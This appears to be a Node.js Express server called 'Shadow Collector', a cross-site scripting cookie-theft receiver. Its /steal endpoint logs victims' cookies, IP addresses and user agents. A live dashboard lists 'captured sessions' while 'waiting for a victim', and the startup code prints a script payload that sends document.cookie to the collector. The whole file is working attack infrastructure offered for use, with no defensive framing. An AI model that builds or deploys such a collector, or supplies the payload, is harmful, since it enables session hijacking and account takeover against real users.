const express = require('express');

const app = express();
const PORT = 4000;

const collected = [];

function escapeHtml(s) {
  if (s == null) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

app.get('/steal', (req, res) => {
  const cookie = String(req.query.c || '');
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  const ts = new Date().toISOString();

  collected.push({ ts, ip, ua, cookie });

  console.log('');
  console.log('================ COOKIE CAPTURED ================');
  console.log('  time   : ' + ts);
  console.log('  from   : ' + ip);
  console.log('  agent  : ' + ua);
  console.log('  cookie : ' + cookie);
  console.log('=================================================');

  res.set('Access-Control-Allow-Origin', '*');
  res.type('image/gif').send(Buffer.from('R0lGODlhAQABAAAAACw=', 'base64'));
});

app.get('/', (req, res) => {
  const rows = collected.length === 0
    ? '<tr><td colspan="4" class="empty">No cookies captured yet. Waiting for a victim...</td></tr>'
    : collected.slice().reverse().map(c => `
      <tr>
        <td class="mono muted">${escapeHtml(c.ts)}</td>
        <td class="mono">${escapeHtml(c.ip)}</td>
        <td class="mono cookie">${escapeHtml(c.cookie)}</td>
        <td class="mono muted ua">${escapeHtml(c.ua)}</td>
      </tr>`).join('');

  res.send(`<!doctype html>
<html><head>
<meta charset="utf-8" />
<title>Shadow Collector · Captured Sessions</title>
<meta http-equiv="refresh" content="3" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Inter', system-ui, sans-serif;
  background: #0a0a0a;
  color: #e8e8e8;
  min-height: 100vh;
  padding: 40px 32px;
}
.hdr {
  display: flex;
  align-items: center;
  gap: 16px;
  max-width: 1400px;
  margin: 0 auto 28px;
}
.skull {
  width: 48px; height: 48px;
  border-radius: 12px;
  background: linear-gradient(135deg, #ff4757, #c44dff);
  display: flex; align-items: center; justify-content: center;
  font-size: 24px;
}
.title { font-size: 24px; font-weight: 800; letter-spacing: -0.02em; }
.sub { color: #888; font-size: 13px; margin-top: 2px; font-family: 'JetBrains Mono', monospace; }
.badge {
  margin-left: auto;
  padding: 6px 14px;
  border-radius: 999px;
  background: rgba(255, 71, 87, 0.15);
  color: #ff4757;
  border: 1px solid rgba(255, 71, 87, 0.35);
  font-size: 12px;
  font-weight: 600;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  font-family: 'JetBrains Mono', monospace;
}
.count {
  display: inline-block;
  padding: 4px 10px;
  background: #1a1a1a;
  border: 1px solid #2a2a2a;
  border-radius: 6px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  color: #c3b8ff;
}
.table-wrap {
  max-width: 1400px;
  margin: 0 auto;
  background: #13151d;
  border: 1px solid #22252f;
  border-radius: 14px;
  overflow: hidden;
}
table { width: 100%; border-collapse: collapse; }
th, td { padding: 14px 18px; text-align: left; border-bottom: 1px solid #22252f; font-size: 13px; vertical-align: top; }
tr:last-child td { border-bottom: none; }
th {
  font-family: 'JetBrains Mono', monospace;
  color: #7a7d8a;
  font-weight: 500;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  font-size: 11px;
  background: #0f1117;
}
.mono { font-family: 'JetBrains Mono', monospace; font-size: 12px; word-break: break-all; }
.cookie { color: #2dd4bf; max-width: 500px; }
.ua { color: #666; max-width: 260px; font-size: 11px; }
.muted { color: #7a7d8a; }
.empty { text-align: center; padding: 60px; color: #555; font-family: 'JetBrains Mono', monospace; }
.footer { max-width: 1400px; margin: 18px auto 0; color: #555; font-size: 12px; font-family: 'JetBrains Mono', monospace; }
</style>
</head><body>
<div class="hdr">
  <div class="skull">☠</div>
  <div>
    <div class="title">Shadow Collector</div>
    <div class="sub">xss-collector · :4000 · <span class="count">${collected.length} captured</span></div>
  </div>
  <div class="badge">● listening</div>
</div>
<div class="table-wrap">
  <table>
    <thead>
      <tr><th>Timestamp</th><th>Source IP</th><th>Cookie</th><th>User Agent</th></tr>
    </thead>
    <tbody>${rows}</tbody>
  </table>
</div>
<div class="footer">// auto-refreshing every 3s</div>
</body></html>`);
});

app.listen(PORT, () => {
  console.log('');
  console.log('  XSS Collector  ——  listening on http://localhost:' + PORT);
  console.log('  Payload example:');
  console.log("    <script>fetch('http://localhost:" + PORT + "/steal?c='+document.cookie)</script>");
  console.log('');
});
